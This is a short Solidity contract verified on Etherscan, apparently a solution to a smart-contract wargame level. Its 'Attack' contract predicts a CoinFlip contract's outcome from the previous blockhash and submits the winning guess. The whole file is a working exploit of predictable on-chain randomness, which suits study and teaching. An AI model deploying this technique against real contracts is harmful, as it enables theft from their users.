/**
 *Submitted for verification at Etherscan.io on 2022-05-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract Attack {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {}

  function winFlip() public {
    CoinFlip target = CoinFlip(0xd6e0423E9EE72Ce6A1Ec7397685290Dee74A7941);


    uint256 blockValue = uint256(blockhash(block.number - 1));
    if (lastHash == blockValue) {
      revert();
    }
    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    target.flip(side);
  }
}